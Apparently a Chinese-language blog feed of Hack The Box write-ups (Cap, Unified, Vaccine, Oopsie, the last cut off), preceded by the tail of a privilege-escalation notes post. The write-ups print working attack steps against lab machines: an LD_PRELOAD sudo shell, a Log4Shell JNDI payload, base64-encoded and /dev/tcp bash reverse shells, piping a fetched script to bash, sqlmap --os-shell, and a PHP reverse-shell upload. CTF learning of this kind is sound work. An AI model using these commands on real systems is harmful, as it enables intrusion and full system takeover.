class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">gcc -fPIC -shared -<span class="hljs-keyword">o</span> <span class="hljs-keyword">shell</span>.<span class="hljs-keyword">so</span> <span class="hljs-keyword">shell</span>.<span class="hljs-keyword">c</span> -nostartfiles  //编译这个<span class="hljs-keyword">shell</span>.<span class="hljs-keyword">c</span>文件为<span class="hljs-keyword">shell</span>.<span class="hljs-keyword">so</span>文件<br><span class="hljs-keyword">ls</span> -<span class="hljs-keyword">al</span> <span class="hljs-keyword">shell</span>.<span class="hljs-keyword">so</span><br>sudo LD_PRELOAD=/tmp/<span class="hljs-keyword">shell</span>.<span class="hljs-keyword">so</span> <span class="hljs-keyword">find</span> //让<span class="hljs-keyword">find</span>在执行的时候绑定编译好的<span class="hljs-keyword">so</span>文件<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241225222532.png"></p><p>类似于 Windows dll劫持，linux是执行so文件，Windows是执行dll文件。</p><h1 id="Windows权限提升"><a href="#Windows权限提升" class="headerlink" title="Windows权限提升"></a>Windows权限提升</h1><h2 id="工具提权"><a href="#工具提权" class="headerlink" title="工具提权"></a>工具提权</h2><p>MSF、CS</p><p><a href="https://www.freebuf.com/articles/web/396553.html">windows权限提升-WIN提权 - FreeBuf网络安全行业门户</a></p><p><a href="https://blog.csdn.net/m0_60571842/article/details/136953674">权限提升-Windows权限提升篇&amp;溢出漏洞&amp;宝塔面板Bypass&amp;CS插件化&amp;MSF模块化_windows权限提升-溢出漏洞-宝塔面板-bypass-cs插件化-msf模块化-CSDN博客</a></p><p><a href="https://blog.csdn.net/m0_74402888/article/details/144075435">DAY136权限提升-Win系统权限提升篇&amp;计算机管理用户&amp;进程注入&amp;令牌窃取&amp;服务启动&amp;远程控制-CSDN博客</a></p><h2 id="人工提权"><a href="#人工提权" class="headerlink" title="人工提权"></a>人工提权</h2><p>优点：解决工具或插件无法实时更新的EXP。<br>缺点：操作繁琐，需要各种复现调试。</p><p><a href="https://mp.weixin.qq.com/s/OW4ybuqtErh_ovkTWLSr8w">【内网攻防】权限提升-土豆提权大汇总</a></p><p><a href="https://blog.csdn.net/m0_60571842/article/details/136974781">权限提升-Windows权限提升篇&amp;溢出漏洞&amp;土豆家族&amp;通杀全系&amp;补丁对比&amp;EXP筛选_土豆系列提权-CSDN博客</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Linux权限提升&quot;&gt;&lt;a href=&quot;#Linux权限提升&quot; class=&quot;headerlink&quot; title=&quot;Linux权限提升&quot;&gt;&lt;/a&gt;Linux权限提升&lt;/h1&gt;&lt;h2 id=&quot;1-内核提权&quot;&gt;&lt;a href=&quot;#1-内核提权&quot; class=&quot;head</summary>
      
    
    
    
    
    <category term="红队技能" scheme="http://example.com/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/"/>
    
  </entry>
  
  <entry>
    <title>Hack-The-Box-Cap</title>
    <link href="http://example.com/2024/12/21/Hack-The-Box-Cap/"/>
    <id>http://example.com/2024/12/21/Hack-The-Box-Cap/</id>
    <published>2024-12-21T07:05:22.000Z</published>
    <updated>2024-12-21T11:08:28.298Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>通过这篇博客，你会了解到 IDOR、FTP协议的安全隐患、linPEAS 的使用、cap_setuid权限。</p><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h1><h1 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h1><p> 首先 nmap 扫描目标主机端口：</p><p><img src="/../images/Pasted%20image%2020241221151154.png"></p><p>先从ftp入手，尝试匿名登录，失败了:</p><p><img src="/../images/Pasted%20image%2020241221151437.png"></p><p>然后从 http 入手，浏览器访问 <a href="http://10.10.10.245/">http://10.10.10.245</a>:</p><p><img src="/../images/Pasted%20image%2020241221152001.png"></p><p>点击 Security Snapshot：</p><p><img src="/../images/Pasted%20image%2020241221172050.png"></p><p>然后点击下载后，下载了一个 1.pcap。这是一个数据包捕获文件，可以用 Wireshark 打开：</p><p><img src="/../images/Pasted%20image%2020241221153106.png"></p><p>可以看出来这捕获的是我们本机的 HTTP 流量，并没有什么用。</p><p>回头看地址栏，发现形式是<code>/data/id</code>，于是猜测将id改为0，会不会看到之前的数据包。此漏洞称为不安全直接对象引用 （Insecure Direct Object Reference，IDOR），用户可以直接访问其他用户拥有的数据。</p><p>成功下载 0.pacp，发现了两条敏感数据： </p><p><img src="/../images/Pasted%20image%2020241221153543.png"></p><p>FTP 流量中包括了用户身份验证。注意 FTP 协议本身存在安全隐患，因为它传输的用户名和密码是明文的，建议使用加密的传输协议（如 FTPS 或 SFTP）来确保数据安全性。于是利用 ssh 远程登录：</p><p><img src="/../images/Pasted%20image%2020241221154009.png"></p><p><img src="/../images/Pasted%20image%2020241221154023.png"></p><p>找到 user flag:<br><img src="/../images/Pasted%20image%2020241221154929.png"></p><h2 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h2><p>之前我们在 Archetype 机器上利用<a href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe">winPEAS</a>，搜索在 Windows 主机上提升权限的可能路径。对于Linux 操作系统，我们使用 <a href="https://github.com/peass-ng/PEASS-ng/releases/download/20241205-c8c0c3e5/linpeas.sh">linPEAS</a>查找提升权限的可能路径。 </p><p>在 linpeas.sh 所在目录启动一个 http.server:</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">8000</span> <br></code></pre></td></tr></table></figure><p>让目标主机获取 linpeas.sh，并将通过管道传输到 bash 直接执行它：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">curl</span> http://10.10.16.18:8000/linpeas.sh | bash<br></code></pre></td></tr></table></figure><p>发现一条重要信息：</p><p><img src="/../images/Pasted%20image%2020241221183706.png"></p><p>发现了在 Oopsie 机器遇到过的 SUID。<code>/usr/bin/python3.8</code> 拥有 <code>cap_setuid</code> 权限，它允许进程在没有设置 SUID 位的情况下切换用户身份到任意 UID。利用这个配置，我们可以切换到 UID 0（即 root）。</p><p>打开 Python 进程，输入以下命令：</p><figure class="highlight moonscript"><table><tr><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">import</span> <span class="hljs-built_in">os</span> <br><span class="hljs-built_in">os</span>.setuid(<span class="hljs-number">0</span>) <br><span class="hljs-built_in">os</span>.system(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241221185733.png"></p><p>成功获取 root 权限：</p><p><img src="/../images/Pasted%20image%2020241221185834.png"></p><p>root flag：</p><p><img src="/../images/Pasted%20image%2020241221190006.png"></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>前面几篇都是 Starting Point 的机器，从这篇开始做 Machines，没想到第一个比以前做过的都简单。多刷，思路就越来越清晰了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;通过这篇博客，你会了解到 IDOR、FTP协议的安全隐患、l</summary>
      
    
    
    
    
    <category term="HackTheBox" scheme="http://example.com/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>Hack-The-Box-Unified</title>
    <link href="http://example.com/2024/12/20/Hack-The-Bdox-Unified/"/>
    <id>http://example.com/2024/12/20/Hack-The-Bdox-Unified/</id>
    <published>2024-12-20T09:47:14.000Z</published>
    <updated>2024-12-21T06:37:14.699Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>这篇博客探讨了利用 Log4J 漏洞攻击一个非常知名的网络设备监控系统——“UniFi” 的效果。通过利用 Log4J 漏洞，并篡改名为 remember 的 POST 头，来攻击 UniFi，从而获取该机器的反向 shell。</p><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h1><p>nmap 扫描目标主机端口：</p><p><img src="/../images/Pasted%20image%2020241220185929.png"></p><p>开放了四个端口，但是好像没得到别的有用信息。换个参数再详细扫描一次，发现两条有用信息：</p><p><img src="/../images/Pasted%20image%2020241220191700.png"></p><p><img src="/../images/Pasted%20image%2020241220192200.png"></p><p>nmap 尝试连接 8080 端口并获取页面标题，但它发现该 HTTP 服务进行了重定向。重定向的目标是 <code>https://10.129.180.69:8443/manage</code>，该页面标题是 UniFi Network。访问这个链接：</p><p><img src="/../images/Pasted%20image%2020241220192536.png"></p><p>可以看到 UniFi 登录页面，版本号为 6.4.54。UniFi 是一个知名的网络设备监控系统。那么现在想到的第一件事久是谷歌搜索这个版本有没有被爆出来的漏洞。通过搜索关键词 <code>UniFy 6.4.54 exploit</code>，找到一篇文章：<a href="https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi">另一个着火的 Log4j：Unifi |链轮安全 — Another Log4j on the fire: Unifi | Sprocket Security</a>，利用 <strong>Log4Shell</strong> 漏洞（CVE-2021-44228）实现对 UniFi 的攻击。</p><ul><li><p><strong>Log4J</strong></p><ul><li>Log4J 是一个流行的 Java 日志记录库，它被广泛用于 Java 应用程序中，用于生成日志输出。</li><li>允许开发者在 Java 程序中记录运行时信息、错误、警告等。</li><li>支持多种输出目标（如控制台、文件、数据库等）</li><li>支持不同格式的输出，比如包括时间戳、日志级别、线程名等。</li></ul></li><li><p><strong>Log4Shell</strong></p><ul><li>该漏洞允许攻击者通过恶意构造的日志消息触发远程代码执行（RCE）。</li><li>Log4J 的 <code>lookup</code> 功能支持 JNDI（Java Naming and Directory Interface）查找，它允许日志信息中的特定字符串动态替换。</li><li>攻击者可以在日志消息中插入包含 JNDI 查找请求的恶意代码，如 <code>$&#123;jndi:ldap://attacker.com/malicious&#125;</code>。</li><li>由于 Log4J 不对 JNDI 查找请求做充分的验证，攻击者可以通过上述方式使得 Log4J 向恶意服务器发起请求，加载并执行远程的恶意代码。</li><li>避免该漏洞的最佳方式是升级到 Log4J 2.16.0 或更高版本，以上版本已禁用 JNDI 查找功能。</li></ul></li></ul><p>首先抓个登录包：</p><p><img src="/../images/Pasted%20image%2020241220202547.png"></p><p>前面那篇文章提到 payload 应该放在 remember 参数中：</p><figure class="highlight crystal"><table><tr><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$&#123;</span><span class="hljs-symbol">jndi:</span><span class="hljs-symbol">ldap:</span>/<span class="hljs-regexp">/10.10.16.6/whatever</span>&#125;<br><br><span class="hljs-comment"># JNDI:通过调用该 API，应用程序可以定位资源和其他程序对象。资源是提供与系统（如数据库服务器和消息系统）连接的程序对象。</span><br><br><span class="hljs-comment"># LDAP:轻量级目录访问协议,默认运行在 389 端口。</span><br></code></pre></td></tr></table></figure><p>由于 POST 数据是作为 JSON 对象发送的，但 payload 也有方括号 {} ，为了防止将其解析为另一个 JSON 对象，将其放在双引号内，以便将其解析为字符串：</p><p><img src="/../images/Pasted%20image%2020241220210130.png"></p><p>点击发送之后，响应包显示 payload 无效：</p><p><img src="/../images/Pasted%20image%2020241220210101.png"></p><p>尽管如此，payload 实际上正在执行。在端口 389 上启动 tcpdump ，它将监控 LDAP 连接的网络流量：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> tcpdump -i tun0 port <span class="hljs-number">389</span><br></code></pre></td></tr></table></figure><p>tcpdump 输出显示我们的机器上正在接收一个连接。这证明该应用程序确实容易受到攻击：</p><p><img src="/../images/Pasted%20image%2020241220211316.png"></p><p>为了构建可以发送到服务器的 payload，并实现远程代码执行，我们必须在系统上安装 Open-JDK 和 Maven：</p><figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm">sudo apt update<br>sudo apt <span class="hljs-keyword">install </span>openjdk<span class="hljs-number">-11</span>-<span class="hljs-keyword">jdk </span>-y<br><span class="hljs-keyword">java </span>-version<br><span class="hljs-comment"># Open-JDK 是 Java 开发工具包，用于构建 Java 应用程序。</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<br><span class="hljs-built_in">sudo</span> apt-get install maven<br>mvn -v<br><span class="hljs-comment"># Maven 是一个集成开发环境 （IDE），用于创建结构化项目并将项目编译成 jar 文件.</span><br></code></pre></td></tr></table></figure><p>安装所需的软件包后，需要下载并构建 Rogue-JNDI ，这是一个用于 JNDI 注入攻击的恶意 LDAP 服务：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/veracode-research/rogue-jndi <br><span class="hljs-built_in">cd</span> rogue-jndi <br>mvn package<br></code></pre></td></tr></table></figure><p>这将在 rogue-jndi&#x2F;target&#x2F; 目录中创建一个 名为 RogueJndi-1-1.jar 的Java 应用程序。<br><img src="/../images/Pasted%20image%2020241221132759.png"></p><p>构造一个实现反弹 shell 的 payload，为防止出现编码问题，对其进行 base64 编码：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> &#x27;bash -c bash -i &gt;&amp;/dev/tcp/<span class="hljs-number">10.10.16.6</span>/<span class="hljs-number">8888</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>&#x27; | base64<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241221135413.png"></p><p>接下来 启动 Rogue-JNDI 应用程序，并传递 payload：</p><figure class="highlight dsconfig"><table><tr><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">java</span> -<span class="hljs-string">jar</span> <span class="hljs-string">target</span>/<span class="hljs-string">RogueJndi-1</span>.<span class="hljs-string">1</span>.<span class="hljs-string">jar</span> <span class="hljs-built_in">--command</span> <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuNi84ODggMD4mMQo=</span><br><span class="hljs-string">&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> <span class="hljs-built_in">--hostname</span> <span class="hljs-string">&quot;10.10.16.6&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241221135610.png"></p><p>本地开启一个监听端口 8888。回到 BurpSuite 将 payload 改为</p><figure class="highlight crystal"><table><tr><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$&#123;</span><span class="hljs-symbol">jndi:</span><span class="hljs-symbol">ldap:</span>/<span class="hljs-regexp">/10.10.16.6:1389/o</span>=tomcat&#125;<br></code></pre></td></tr></table></figure><p>发送之后，rogue 服务器显示以下内容：</p><figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript">Sending LDAP ResourceRef <span class="hljs-literal">result</span> <span class="hljs-keyword">for</span> o=tomcat <span class="hljs-keyword">with</span> javax.el.ELProcessor payload<br></code></pre></td></tr></table></figure><p>然后监听端口处应该成功获得目标主机的 shell ，但是我反复尝试多次均失败，于是放弃，了解了这个思路就好。</p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>这个靶场复现失败了，但也是有收获的。以后在渗透过程中，要做好信息收集，目标是否存在已被爆出的漏洞也是重要的一部分。除此之外，也了解了 java 相关的一些知识。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;这篇博客探讨了利用 Log4J 漏洞攻击一个非常知名的网络设</summary>
      
    
    
    
    
    <category term="HackTheBox" scheme="http://example.com/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>Hack The Box-Vaccine</title>
    <link href="http://example.com/2024/12/20/Hack-The-Box-Vaccine/"/>
    <id>http://example.com/2024/12/20/Hack-The-Box-Vaccine/</id>
    <published>2024-12-20T03:36:34.000Z</published>
    <updated>2024-12-20T09:24:45.032Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>看完这篇博客，你会了解到 ftp 匿名登录、John the Ripper 爆破密码、sqlmap、升级临时 shell、ssh、GTFOBins等。</p><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h1><h2 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h2><p>nmap 扫描开放端口：</p><p><img src="/../images/Pasted%20image%2020241220115219.png"></p><p>先从 ftp 入手，因为我们看到它允许匿名登录，而且有一个 backup.zip。</p><p>首先连接 ftp 服务器：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ftp</span> <span class="hljs-number">10.129.116.3</span><br><span class="hljs-comment"># 用户名：anonymous 或 ftp</span><br><span class="hljs-comment"># 密码 ：任意字符</span><br></code></pre></td></tr></table></figure><p>下载 backup.zip:</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">get</span> backup.zip<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241220120901.png"></p><p>解压，发现需要密码：</p><p><img src="/../images/Pasted%20image%2020241220121127.png"></p><p>之前介绍过 <strong>John the Ripper</strong> 工具，它可以破解多种加密算法生成的密码哈希，例如 DES、MD5、SHA、bcrypt、Windows LM&#x2F;NTLM 哈希、ZIP 文件密码、PDF 文件密码等。</p><p>对于 ZIP 文件，需要使用 <code>zip2john</code> 工具提取哈希：</p><figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm">zip2john <span class="hljs-keyword">backup.zip </span>&gt; hashes<br></code></pre></td></tr></table></figure><p>然后加载字典，对以上哈希值进行暴力破解：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">john <span class="hljs-attribute">-wordlist</span>=Desktop/wordlists/rockyou.txt hashes<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241220123408.png"></p><p>查看 index.php，发现管理员密码：</p><p><img src="/../images/Pasted%20image%2020241220123843.png"></p><p><img src="/../images/Pasted%20image%2020241220124943.png"></p><p>浏览器访问 <a href="http://10.129.116.3/">http://10.129.116.3</a> ，登录管理员账号：</p><p><img src="/../images/Pasted%20image%2020241220125130.png"></p><p>这个功能一定是和数据库连接的:</p><p><img src="/../images/Pasted%20image%2020241220134002.png"></p><p>接下来使用 SQLmap 测试是否存在 SQL 注入。注意这里我们是用管理员身份登录的，所以一定要带上 cookie：</p><p><img src="/../images/Pasted%20image%2020241220135057.png"></p><figure class="highlight abnf"><table><tr><td class="code"><pre><code class="hljs abnf">sqlmap -u <span class="hljs-string">&quot;http://10.129.116.3/dashboard.php?search=Elixir&quot;</span> --cookie<span class="hljs-operator">=</span><span class="hljs-string">&quot;PHPSESSID=23gd5c0ih2s72tfon818qq9f4s&quot;</span><br></code></pre></td></tr></table></figure><p>结果是 search 参数容易受到 sql 注入的攻击：</p><p><img src="/../images/Pasted%20image%2020241220135713.png"></p><p>接下来使用<code>--os-shell</code>参数执行命令注入：</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://10.129.116.3/dashboard.php?search=Elixir&quot;</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">&quot;PHPSESSID=23gd5c0ih2s72tfon818qq9f4s&quot;</span> <span class="hljs-params">--os-shell</span><br></code></pre></td></tr></table></figure><p>虽然通过 OS-shell 获得了命令行控制，但它只在当前会话有效，并且权限可能会受到限制。为了拥有更强的远程控制能力、绕过防火墙的能力和更持久的连接，我们还是像以前一样执行反弹 shell：</p><figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm">bash -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.16.6/888 0&gt;&amp;1&quot;</span><br># bash -<span class="hljs-keyword">c</span> 启动一个新的 Bash 实例隔离环境，确保反向 shell 能顺利启动。<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">888</span><br></code></pre></td></tr></table></figure><p>升级 shell，使其成为一个完全的交互式 shell。</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">SHELL</span>=/bin/bash<span class="hljs-built_in"> script </span>-q /dev/<span class="hljs-literal">null</span><br>stty<span class="hljs-built_in"> raw </span>-echo<br>reset<br>xterm<br></code></pre></td></tr></table></figure><p>找到 user flag:<br><img src="/../images/Pasted%20image%2020241220150955.png"></p><h2 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h2><p>接下来进行权限提升。使用 <code>sudo -l</code> 查看当前用户的 sudo 权限，判断是否有潜在的提权漏洞。但是首先我们要找到当前用户的密码。</p><p>猜测网站目录下应该有明文密码。最终在 &#x2F;var&#x2F;www&#x2F;html&#x2F;dashboard.php 中找到了当前用户的密码：<br><img src="/../images/Pasted%20image%2020241220153202.png"></p><p>shell 总是自动断开，由于目标主机的 22 端口处于开放状态，所以得到密码之后我们可以用 ssh 远程登录：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> postgres@<span class="hljs-number">10.129.116.3</span><br></code></pre></td></tr></table></figure><p>然后 <code>sudo -l</code>：</p><p><img src="/../images/Pasted%20image%2020241220154417.png"></p><p>当处于只有某些二进制文件可用的情况下时，如何获得 root 权限可以参考<a href="%5BGTFOBins%5D(https://gtfobins.github.io/)">GTFOBins</a>。</p><p>当前用户可以使用 <code>vi</code> ，查找相应的文档：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">// <span class="hljs-keyword">If</span> the binary <span class="hljs-keyword">is</span> allowed <span class="hljs-keyword">to</span> run <span class="hljs-keyword">as</span> <span class="hljs-keyword">superuser</span> <span class="hljs-keyword">by</span> `sudo`, it does <span class="hljs-keyword">not</span> <span class="hljs-keyword">drop</span> the elevated <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">and</span> may be used <span class="hljs-keyword">to</span> <span class="hljs-keyword">access</span> the file <span class="hljs-keyword">system</span>, escalate <span class="hljs-keyword">or</span> maintain privileged <span class="hljs-keyword">access</span>.<br><br>sudo vi -c <span class="hljs-string">&#x27;:!/bin/sh&#x27;</span> /dev/<span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure><p>在此场景中，<code>sudo</code> 会使得 <code>vi</code> 编辑器以 root 身份运行，而 <code>vi</code> 中的 <code>:!/bin/sh</code> 命令又会启动一个新的 shell。因此，整个过程不会放弃 root 权限，攻击者可以利用这种方式获取到系统的 root 权限。因此我们执行：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">sudo /bin/vi /etc/postgresql/<span class="hljs-number">11</span>/main/pg_hba.conf -c <span class="hljs-string">&#x27;:!/bin/sh&#x27;</span> /dev/<span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241220163003.png"></p><p>因为当前用户的 sudo 权限仅限于 <code>/bin/vi/etc/postgresql/11/main/pg_hba.conf</code> ，所以这种方法不可行。文档中还有一种方法:</p><p><img src="/../images/Pasted%20image%2020241220163300.png"></p><p>于是</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">sudo /bin/vi /etc/postgresql/<span class="hljs-number">11</span>/main/pg_hba.conf<br></code></pre></td></tr></table></figure><p>在 <code>vi</code> 编辑器中按冒号执行以下命令：</p><figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">set</span> <span class="hljs-keyword">shell</span>=/bin/<span class="hljs-keyword">sh</span><br># 将 `<span class="hljs-keyword">vi</span>` 编辑器的外部 <span class="hljs-keyword">shell</span> 设置为 `/bin/<span class="hljs-keyword">sh</span>`<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241220164222.png"></p><p>按下回车后，输入以下命令：</p><figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">shell</span><br># 启动一个外部 <span class="hljs-keyword">shell</span>，<span class="hljs-keyword">vi</span> 编辑器会临时退出。<br></code></pre></td></tr></table></figure><p>成功获取 root 权限和 root flag：</p><p><img src="/../images/Pasted%20image%2020241220164820.png"></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>这个靶场相对来说简单一些，整个过程中用到的知识，很多都是以前学习过的，但是我并没有完全掌握。应该以后用多了就熟能生巧了吧，希望是这样的哈哈哈。最大的收获是，了解了在只有某些二进制文件可用时的提权手段。继续坚持学吧，虽然不知道能坚持到什么时候。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;看完这篇博客，你会了解到 ftp 匿名登录、John the</summary>
      
    
    
    
    
    <category term="HackTheBox" scheme="http://example.com/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>Hack The Box-Oopsie</title>
    <link href="http://example.com/2024/12/19/Hack-The-Box-Oopsie/"/>
    <id>http://example.com/2024/12/19/Hack-The-Box-Oopsie/</id>
    <published>2024-12-19T05:29:50.000Z</published>
    <updated>2024-12-20T07:20:22.112Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>在寻找 WEB 漏洞时，始终要检查cookie、session，并尝试弄清楚访问控制是如何工作的。在许多情况下，远程代码执行和系统的控制权限可能无法单独实现，而是需要将不同类型的漏洞和利用方法结合起来。在本篇博客中，你将学习到，信息泄露和访问控制漏洞这类看似不太重要的漏洞。即使是小漏洞在攻击时也可能会产生巨大影响。</p><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h1><h2 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h2><p>nmap 扫描端口： </p><p><img src="/../images/Pasted%20image%2020241219134020.png"></p><p>访问 <a href="http://10.129.180.28/">http://10.129.180.28</a>:</p><p><img src="/../images/Pasted%20image%2020241219134256.png"></p><p>打开 BurpSuite 的 Target 模块，Site Map功能可以看到目标网站的结构：</p><p><img src="/../images/Pasted%20image%2020241219141112.png"></p><p>发现了一个登录界面：</p><p><img src="/../images/Pasted%20image%2020241219141225.png"></p><p>以访客身份登录：</p><p><img src="/../images/Pasted%20image%2020241219142614.png"></p><p>唯一可操作的就是 uploads 界面，但是需要超级管理员权限：</p><p><img src="/../images/Pasted%20image%2020241219142747.png"></p><p>一种思路就是查看 cookie 或 seesion，是否有操作空间转换为管理员身份：</p><p><img src="/../images/Pasted%20image%2020241219143134.png"></p><p>可以看到，cookie 中有个值就是 Access ID。那么只需获取到 admin 的 Access ID，就可以伪造管理员身份。而 URL 中有个 id 变量，就可以切换账户。凭此漏洞，我们发现，将 id 改为1，显示出了 admin 的 Access ID：</p><p><img src="/../images/Pasted%20image%2020241219143952.png"></p><p>更改cooike，即可访问 uploads 页面：</p><p><img src="/../images/Pasted%20image%2020241219144121.png"></p><p>这里尝试上传后门失败了，查看题解发现可以上传执行反弹 shell 的文件，插件分析出的语言类型是php。</p><p>首先要知道文件上传到哪了。用 gobuster 进行目录爆破：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gobuster</span> dir -u http://<span class="hljs-number">10.129.180.28</span> -w wordlists/dirbuster/directory-list-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>-small.txt<br></code></pre></td></tr></table></figure><p>果然是 uploads 文件夹：</p><p><img src="/../images/Pasted%20image%2020241219151440.png"></p><p>然后上传 PHP 反弹shell。Kali Linux自带此类文件，在 &#x2F;usr&#x2F;share&#x2F;webshells&#x2F; 目录下。也可以从<a href="https://github.com/BlackArch/webshells">BlackArch&#x2F;webshells: Various webshells. We accept pull requests for additions to this collection.</a>下载。</p><p>本机开启一个监听端口：</p><p><img src="/../images/Pasted%20image%2020241219152611.png"></p><p>php-reverse-shell.php 更改主机 ip 和端口：</p><p><img src="/../images/Pasted%20image%2020241219152457.png"></p><p>上传这个文件，然后在浏览器访问我们上传的shell：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">10.129</span>.<span class="hljs-number">180.28</span><span class="hljs-regexp">/uploads/</span>php-reverse-shell.php<br></code></pre></td></tr></table></figure><p>成功执行反弹 shell。</p><p>输入 <code>whoami</code> 命令，发现当前用户是 www-data：<br><img src="/../images/Pasted%20image%2020241219174655.png"></p><p>在 Linux 系统中，<code>/etc/passwd</code> 是一个非常重要的系统文件，它存储了系统中的所有用户账户信息。每一行代表一个用户的信息，每个字段用冒号分隔：</p><figure class="highlight autohotkey"><table><tr><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">用户名:密码:用户ID:组ID:注释:主目录:</span>登录Shell<br><br># 